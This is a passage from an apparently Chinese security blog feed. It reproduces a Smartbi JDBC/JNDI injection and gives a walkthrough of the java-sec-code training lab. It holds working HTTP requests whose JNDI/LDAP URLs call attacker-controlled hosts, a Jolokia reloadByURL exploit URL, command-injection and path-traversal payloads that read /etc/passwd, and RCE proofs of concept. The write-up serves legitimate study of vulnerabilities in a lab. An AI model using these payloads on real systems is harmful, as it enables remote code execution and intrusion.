class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /smartbi/vision/RMIServlet HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost:<span class="hljs-number">18080</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">113</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5672</span>.<span class="hljs-number">127</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded;charset=UTF-<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>: */*<br><span class="hljs-attribute">Origin</span>: http://localhost<br><span class="hljs-attribute">Referer</span>: http://localhost:<span class="hljs-number">18080</span>/smartbi/vision/index.jsp<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Cookie</span>: JSESSIONID=<span class="hljs-number">3</span>D904649DC50813C9D6EDEBC582EE4CF<br><span class="hljs-attribute">Connection</span> : keep-alive<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">457</span><br><br><span class="hljs-attribute">className</span>=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span>%<span class="hljs-number">3</span>a100,<span class="hljs-string">&quot;user&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;SELECT+1+FROM+DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JNDI:ldap://9sjhyp.dnslog.cn&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span>%<span class="hljs-number">3</span>a-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span>%<span class="hljs-number">3</span>a0,<span class="hljs-string">&quot;dbToCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br><br><br><span class="hljs-attribute">className</span>=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span>%<span class="hljs-number">3</span>a100,<span class="hljs-string">&quot;user&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;SELECT+1+FROM+DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JNDI:ldap://192.168.1.25:15089/547b87&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span>%<span class="hljs-number">3</span>a-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span>%<span class="hljs-number">3</span>a0,<span class="hljs-string">&quot;dbToCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br></code></pre></td></tr></table></figure><p>ldap:&#x2F;&#x2F;192.168.1.25:15089&#x2F;b69569</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703187.png" alt="20250806193947601"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703694.png" alt="20250806194037543"></p><p>收到DNSLOG记录，说明漏洞存在</p><h1 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h1><p>CVE-2020-1938 ：Apache Tomcat AJP 漏洞复现和分析</p><p><a href="https://www.cnblogs.com/backlion/p/12870365.html">https://www.cnblogs.com/backlion/p/12870365.html</a></p><p>Smartbi 身份认证绕过漏洞</p><p><a href="https://www.freebuf.com/vuls/373015.html">https://www.freebuf.com/vuls/373015.html</a></p><p>信息搜集相关：</p><p><a href="https://ckcah.github.io/2020/05/01/googlehack/">https://ckcah.github.io/2020/05/01/googlehack/</a></p><p><a href="https://94248.github.io/2023/07/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%9B%B8%E5%85%B3/">https://94248.github.io/2023/07/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%9B%B8%E5%85%B3/</a></p><p>servlet</p><p><a href="https://86263008.github.io/web2024/back/java/jsp/servlet/index.html">https://86263008.github.io/web2024/back/java/jsp/servlet/index.html</a></p><p><a href="https://kirklin.github.io/PrivateNotes/Java%E5%85%A8%E5%A5%97/JavaWeb/Servlet/#_11">https://kirklin.github.io/PrivateNotes/Java%E5%85%A8%E5%A5%97/JavaWeb/Servlet/#_11</a></p><p><a href="https://blog.csdn.net/yxmoar/article/details/109889006">https://blog.csdn.net/yxmoar/article/details/109889006</a></p><p>JDBC反序列化学习</p><p><a href="https://sp4zcmd.github.io/2021/09/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/">https://sp4zcmd.github.io/2021/09/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</a></p><p><a href="https://xz.aliyun.com/news/7754">https://xz.aliyun.com/news/7754</a></p><p><a href="https://www.cnblogs.com/Litsasuk/articles/18410624">https://www.cnblogs.com/Litsasuk/articles/18410624</a></p><p><a href="https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html">https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html</a></p><h1 id="javachains使用"><a href="#javachains使用" class="headerlink" title="javachains使用"></a><strong>javachains使用</strong></h1><p><a href="https://java-chains.vulhub.org/zh/">https://java-chains.vulhub.org/zh/</a></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># docker 搭建</span><br><span class="hljs-attribute">docker</span> pull javachains/javachains:latest<br><br>docker run -d<span class="hljs-regexp"> ^</span><br>  --name java-chains<span class="hljs-regexp"> ^</span><br>  --restart=always<span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">8011</span>:<span class="hljs-number">8011</span><span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">58080</span>:<span class="hljs-number">58080</span><span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">15089</span>:<span class="hljs-number">50389</span><span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">3308</span>:<span class="hljs-number">3308</span><span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">13999</span>:<span class="hljs-number">13999</span><span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">50000</span>:<span class="hljs-number">50000</span><span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">11527</span>:<span class="hljs-number">11527</span><span class="hljs-regexp"> ^</span><br>  -e CHAINS_AUTH=<span class="hljs-literal">true</span><span class="hljs-regexp"> ^</span><br>  -e CHAINS_PASS=<span class="hljs-regexp"> ^</span><br>  javachains/javachains:latest<br><br><span class="hljs-comment">#查看当前正在运行的容器</span><br>docker ps<br><br><span class="hljs-comment">#查找日志中包含关键词 password 的行</span><br>docker logs java-chains | findstr password<br>&gt;<span class="hljs-number">08</span>-<span class="hljs-number">02</span> <span class="hljs-number">08</span>:<span class="hljs-number">06</span>:<span class="hljs-number">01</span>.<span class="hljs-number">144</span> INFO  [main] c.a.c.w.c.SecurityConfig       |  | password: HDVhxC2MfhKJwcAN<br><br><span class="hljs-comment">#停止</span><br>docker stop java-chains<br><br><span class="hljs-comment">#删除</span><br>docker rm java-chains<br><br></code></pre></td></tr></table></figure><blockquote><p>Windows 系统<strong>将 50389 端口作为排除范围</strong>，不允许程序（包括 Docker）绑定使用它。如果改端口可能有一些问题，还是尽量在Linux搭可以避免端口问题。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703682.png" alt="20250806200152925"></p></blockquote><p>访问 <code>localhost:8011</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703554.png" alt="20250806200418498"></p><p>密码：<code>docker logs java-chains | findstr password</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071704470.png" alt="20250806200413737"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java 代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java-sec-code 靶场题解</title>
    <link href="/2025/07/28/java-sec-code-master%20%E9%9D%B6%E5%9C%BA/"/>
    <url>/2025/07/28/java-sec-code-master%20%E9%9D%B6%E5%9C%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="java-sec-code-靶场"><a href="#java-sec-code-靶场" class="headerlink" title="java-sec-code 靶场"></a>java-sec-code 靶场</h1><h1 id="一、靶场环境"><a href="#一、靶场环境" class="headerlink" title="一、靶场环境"></a>一、靶场环境</h1><p>源码地址：</p><p><a href="https://github.com/JoyChou93/java-sec-code">https://github.com/JoyChou93/java-sec-code</a></p><p>搭建环境：</p><p>IDEA，pache-maven-3.9.1，apache-tomcat-9.0.105，JDK 1.8，MySQL 5.7.26，</p><p>​数据库：小皮面板自带的MySQL，导入sql文件</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080924734.png" alt="20250722121837762"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080924866.png" alt="20250722121922614"></p><p>​修改数据库密码</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080924471.png" alt="20250722121952382"></p><p>​默认端口为8080，如果被占用，在 application.properties 中写入 <code>server.port=8081</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080925668.png" alt="20250722122032495"></p><p>之后启动 Maven install</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080925205.png" alt="20250722122150263"></p><p>运行 Application.java</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080926472.png" alt="20250722122307068"></p><p>访问 127.0.0.1:8081</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080926105.png" alt="20250722122339704"></p><p>搭建成功</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080926235.png" alt="20250722122412538"></p><p>以下是一些小的改动：</p><p>参考文章：<a href="https://www.freebuf.com/articles/web/289863.html">https://www.freebuf.com/articles/web/289863.html</a></p><blockquote><p>因为项目作者选择的工作环境为linux操作系统，而我本人选择的工作环境为windows操作系统，所以为了部分功能运行成功需要修改几处源码，首先修改CommandInject.java文件下的源码，将sh执行命令替换为cmd命令，还有修改源码中一些其它的linux操作系统上独有的命令。</p></blockquote><ol><li>src&#x2F;main&#x2F;java&#x2F;org&#x2F;joychou&#x2F;controller&#x2F;CommandInject.java</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//String[] cmdList = new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filepath&#125;;</span><br>String[] cmdList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, <span class="hljs-string">&quot;dir &quot;</span> + filepath&#125;;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080926915.png" alt="20250722122752916"></p><ol start="2"><li>src&#x2F;main&#x2F;resources&#x2F;templates&#x2F;index.html</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--    &lt;a th:href=&quot;@&#123;/codeinject?filepath=/tmp;cat /etc/passwd&#125;&quot;&gt;CmdInject&lt;/a&gt;&amp;nbsp;&amp;nbsp;--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/codeinject?filepath=.%26ipconfig&#125;&quot;</span>&gt;</span>CmdInject<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>   <br><span class="hljs-comment">&lt;!--    &lt;a th:href=&quot;@&#123;/path_traversal/vul?filepath=../../../../../etc/passwd&#125;&quot;&gt;PathTraversal&lt;/a&gt;&amp;nbsp;&amp;nbsp;--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/path_traversal/vul?filepath=D:/test.txt&#125;&quot;</span>&gt;</span>PathTraversal<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <br><span class="hljs-comment">&lt;!--    &lt;a th:href=&quot;@&#123;/ssrf/urlConnection/vuln?url=file:///etc/passwd&#125;&quot;&gt;SSRF&lt;/a&gt;&amp;nbsp;&amp;nbsp;--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/ssrf/urlConnection/vuln?url=file:///D:/test.txt&#125;&quot;</span>&gt;</span>SSRF<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080926719.png" alt="20250722123350854"></p><h1 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h1><ul><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/Actuators-to-RCE">Actuators to RCE</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/CORS">CORS</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/CSRF">CSRF</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/Deserialize">Deserialize</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/Fastjson">Fastjson</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/Java-RMI">Java RMI</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/JSONP">JSONP</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/Poi-ooxml-XXE">POI-OOXML XXE</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/SQL-Inject">SQLI</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/SSRF">SSRF</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/SSTI">SSTI</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/URL-whtielist-Bypass">URL whitelist Bypass</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/XXE">XXE</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/JWT">JWT</a>  </li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/others">Others</a></li></ul><h3 id="Logback-xml"><a href="#Logback-xml" class="headerlink" title="Logback.xml"></a>Logback.xml</h3><p>src&#x2F;main&#x2F;resources&#x2F;logback-online.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span>  <span class="hljs-comment">&lt;!-- logback 配置文件标签 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">appender</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;STDOUT&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span>   <span class="hljs-comment">&lt;!-- 控制台输出标签 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">withJansi</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">withJansi</span>&gt;</span>  <span class="hljs-comment">&lt;!-- Jansi 是一个 Java 库，用来支持彩色日志输出  --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">encoder</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 输出格式标签 --&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">pattern</span>&gt;</span>[%thread] %highlight(%-5level) %cyan(%logger&#123;15&#125;) - %msg %n<span class="hljs-tag">&lt;/<span class="hljs-name">pattern</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 输出格式 --&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">encoder</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">appender</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">root</span> <span class="hljs-attr">level</span>=<span class="hljs-string">&quot;info&quot;</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 根标签 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">appender-ref</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;STDOUT&quot;</span> /&gt;</span>  <span class="hljs-comment">&lt;!-- 引用控制台输出标签 --&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">jmxConfigurator</span>/&gt;</span>  <span class="hljs-comment">&lt;!-- 暴露 Logback 的运行时配置能力（开启 JMX 管理功能）  --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>漏洞产生原因：</strong></p><p><code>   &lt;jmxConfigurator/&gt;</code></p><p>作用：暴露 Logback 的运行时配置能力（开启 JMX 管理功能）</p><p>这个配置会注册一个 JMX MBean （可以远程管理的 Java 对象 ，“遥控器”），它允许用户通过 JMX 控制台、Jolokia （Jolokia 是一个用来访问远程 JMX MBeans 的方法，Jolokia 通过 HTTP 访问 JMX）等远程管理工具调用 Logback 的方法</p><p>如果系统部署中 暴露了 Jolokia 的 &#x2F;jolokia 接口，攻击者可以远程调用 Logback 的 reloadByURL 方法，加载恶意配置文件，进而发起 JNDI 注入 ➜ 远程代码执行（RCE）</p><p><strong>漏洞利用：</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8081</span><span class="hljs-regexp">/jolokia/</span>exec<span class="hljs-regexp">/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/</span>reloadByURL<span class="hljs-regexp">/http:!/</span>!<span class="hljs-regexp">/127.0.0.1:8888!/</span>xxx.xml<br></code></pre></td></tr></table></figure><ul><li><p><code>/jolokia/exec/</code>：Jolokia 的 exec 调用路径</p></li><li><p><code>ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator</code>：Logback 中添加 <code>&lt;jmxConfigurator/&gt;</code> 注册 JMX MBean 后的默认名称</p></li><li><p><code>/reloadByURL/</code>：调用的 JMX 方法，即 <code>reloadByURL(URL configFile)</code>，运行后重新加载 Logback 配置文件</p></li><li><p><code>http:!/!/127.0.0.1:8888!/xxx.xml</code>：注意 <code>!/!/</code> 是 URL 编码中对 <code>/</code> 和 <code>:</code> 的绕过手法，最后解析成：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//127.0.0.1:8888/xxx.xml</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="Rce-java"><a href="#Rce-java" class="headerlink" title="Rce.java"></a>Rce.java</h3><p>src&#x2F;main&#x2F;java&#x2F;org&#x2F;joychou&#x2F;controller&#x2F;Rce.java</p><h4 id="1-runtime-exec"><a href="#1-runtime-exec" class="headerlink" title="1.&#x2F;runtime&#x2F;exec"></a>1.&#x2F;runtime&#x2F;exec</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rce</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/runtime/exec&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">CommandExec</span><span class="hljs-params">(String cmd)</span> &#123;<span class="hljs-comment">//接收 cmd 参数</span><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<span class="hljs-comment">//获取当前 JVM 的 RunTime 对象，通过它可以调用 exec 命令</span><br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<span class="hljs-comment">//接收输出结果</span><br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> run.exec(cmd);<span class="hljs-comment">//执行 cmd 命令</span><br>            <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(p.getInputStream());<br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">inBr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(in));<br>            String tmpStr;<br><br>            <span class="hljs-keyword">while</span> ((tmpStr = inBr.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                sb.append(tmpStr);<br>            &#125;<br></code></pre></td></tr></table></figure><p>没有进行过滤，产生了rce 漏洞</p><p><strong>漏洞利用：</strong></p><p>POC：&#x2F;rce&#x2F;runtime&#x2F;exec?cmd&#x3D;calc.exe</p><p>可以弹出计算机</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080927152.png" alt="20250722141657147"></p><p>POC：&#x2F;rce&#x2F;runtime&#x2F;exec?cmd&#x3D;whoami</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080927609.png" alt="20250722141728262"></p><h4 id="2-ProcessBuilder"><a href="#2-ProcessBuilder" class="headerlink" title="2.&#x2F;ProcessBuilder"></a>2.&#x2F;ProcessBuilder</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/ProcessBuilder&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">processBuilder</span><span class="hljs-params">(String cmd)</span> &#123;<span class="hljs-comment">//接收输入的 cmd</span><br><br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            String[] arrCmd = &#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125;;<span class="hljs-comment">//将 cmd 直接拼接到 shell 环境</span><br>            <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">processBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(arrCmd);<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> processBuilder.start();<span class="hljs-comment">//触发命令执行</span><br>            <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(p.getInputStream());<br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">inBr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(in));<br>            String tmpStr;<br><br></code></pre></td></tr></table></figure><p>这一漏洞需要在Linux环境中复现</p><h4 id="3-jscmd"><a href="#3-jscmd" class="headerlink" title="3.&#x2F;jscmd"></a>3.&#x2F;jscmd</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/jscmd&quot;)</span>  <span class="hljs-comment">// 定义GET请求端点</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span 